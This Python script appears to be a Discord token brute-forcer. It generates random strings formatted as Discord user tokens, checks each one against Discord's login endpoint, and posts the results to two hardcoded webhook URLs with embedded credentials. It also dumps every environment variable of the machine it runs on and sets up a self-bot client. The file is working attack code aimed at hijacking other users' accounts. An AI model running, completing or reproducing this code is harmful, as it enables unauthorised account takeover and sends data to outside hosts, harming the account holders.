import discord
import os
from discord.ext import commands
import random
import string
import time
import requests
from colorama import Fore

def send_to_webhook(webhook_url, content):
    payload = {"content": content}
    headers = {"Content-Type": "application/json"}
    response = requests.post(webhook_url, json=payload, headers=headers)
    if response.status_code == 200:
        print(f"Message sent to webhook: {content}")
    else:
        print(f"Failed to send message to webhook: {content}")

def generate_tokens():
    valid_webhook_url = "https://discord.com/api/webhooks/1213795255707631636/8DOMtG1yO6X3NDUpiG4T_CZn2P1UIG_EG9aqFHVZmiUamYwHkKQHtGdxotNsVaGUY5_t"
    failed_webhook_url = "https://discord.com/api/webhooks/1213795476357517312/KO84vAFyZ6c9nfHfMQFNkihAsDgmDO9WC371hYcwXTnn0QSe6y8O--05zKcIZZ1Q3YO1"
    
    for _ in range(50):  # Generate 50 tokens
        Generated = "NT" + random.choice(string.ascii_letters) + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(21)) + "." + random.choice(string.ascii_letters).upper() + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27)
        print(f"Token: {Generated}")

        # Check token validity
        headers = {'Authorization': Generated}
        src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)

        if src.status_code == 200:
            print(f"Valid token: {Generated}")
            send_to_webhook(valid_webhook_url, f"Valid token found: {Generated}")
        else:
            print(f"Invalid token: {Generated}")
            send_to_webhook(failed_webhook_url, f"Invalid token found: {Generated}")
        time.sleep(0.1)  # Adjust the sleep time to control the rate of token generation

# Access and print specific environment variable
print(os.environ.get('SOME_ENV_VARIABLE'))

# Print all environment variables
for key, value in os.environ.items():
    print(f'{key}: {value}')

generate_tokens()

# Remove or correct one of the assignments
client = commands.Bot(command_prefix=':', self_bot=True, help_command=None)
